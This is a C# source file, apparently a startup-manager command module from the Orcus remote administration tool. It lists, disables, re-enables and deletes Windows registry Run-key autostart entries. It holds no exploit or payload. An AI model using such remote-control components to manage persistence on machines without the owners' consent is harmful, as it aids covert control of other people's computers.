using System;
using System.Collections.Generic;
using Microsoft.Win32;
using Orcus.Shared.Commands.StartupManager;

namespace Orcus.Commands.StartupManager
{
    public static class RegistryAutostart
    {
        public static List<AutostartProgramInfo> GetAutostartProgramsFromRegistryKey(
            AutostartLocation autostartLocation, bool isEnabled)
        {
            var result = new List<AutostartProgramInfo>();
            try
            {
                using (var registryKey = GetRegistryKeyFromAutostartLocation(autostartLocation, isEnabled, false))
                {
                    if (registryKey != null)
                        foreach (var valueName in registryKey.GetValueNames())
                        {
                            var value = registryKey.GetValue(valueName) as string;
                            if (value == null)
                                continue;

                            var entry = new AutostartProgramInfo
                            {
                                Name = valueName,
                                CommandLine = value,
                                IsEnabled = isEnabled,
                                AutostartLocation = autostartLocation
                            };

                            result.Add(AutostartManager.CompleteAutostartProgramInfo(entry));
                        }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            return result;
        }

        public static void ChangeAutostartEntry(AutostartLocation autostartLocation, string name, bool isEnabled)
        {
            if (!isEnabled)
                CreateDisabledSubKey(autostartLocation);

            using (var registryKey = GetRegistryKeyFromAutostartLocation(autostartLocation, !isEnabled, true))
            using (var registryKey2 = GetRegistryKeyFromAutostartLocation(autostartLocation, isEnabled, true))
            {
                var value = registryKey.GetValue(name);
                registryKey2.SetValue(name, value, RegistryValueKind.String);
                registryKey.DeleteValue(name);

                //Delete empty disabled key
                if (isEnabled && registryKey.ValueCount == 0)
                    registryKey2.DeleteSubKey("AutorunsDisabled");
            }
        }

        public static void RemoveAutostartEntry(AutostartLocation autostartLocation, string name, bool isEnabled)
        {
            using (var registryKey = GetRegistryKeyFromAutostartLocation(autostartLocation, isEnabled, true))
                registryKey.DeleteValue(name);

            //Delete the subkey for disabled entries if there aren't any entries left
            if (!isEnabled)
                using (var disabledKey = GetDisabledSubKey(autostartLocation, true))
                    if (disabledKey != null && disabledKey.ValueCount == 0)
                        using (var baseKey = GetRegistryKeyFromAutostartLocation(autostartLocation, true))
                            baseKey.DeleteSubKey("AutorunsDisabled");
        }

        private static RegistryKey GetRegistryKeyFromAutostartLocation(AutostartLocation autostartLocation,
            bool writeable)
        {
            switch (autostartLocation)
            {
                case AutostartLocation.HKCU_Run:
                    return
                        Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", writeable);
                case AutostartLocation.HKLM_Run:
                    return
                        Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", writeable);
                case AutostartLocation.HKLM_WOWNODE_Run:
                    return
                        Registry.LocalMachine.OpenSubKey(@"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
                            writeable);
                default:
                    throw new ArgumentOutOfRangeException(nameof(autostartLocation), autostartLocation, null);
            }
        }

        private static RegistryKey GetRegistryKeyFromAutostartLocation(AutostartLocation autostartLocation,
            bool isEnabled,
            bool writeable)
        {
            return isEnabled
                ? GetRegistryKeyFromAutostartLocation(autostartLocation, writeable)
                : GetDisabledSubKey(autostartLocation, writeable);
        }

        private static RegistryKey GetDisabledSubKey(AutostartLocation autostartLocation, bool writeable)
        {
            using (var baseKey = GetRegistryKeyFromAutostartLocation(autostartLocation, writeable))
                return baseKey.OpenSubKey("AutorunsDisabled", writeable);
        }

        private static void CreateDisabledSubKey(AutostartLocation autostartLocation)
        {
            using (var baseKey = GetRegistryKeyFromAutostartLocation(autostartLocation, true))
                baseKey.CreateSubKey("AutorunsDisabled");
        }
    }
}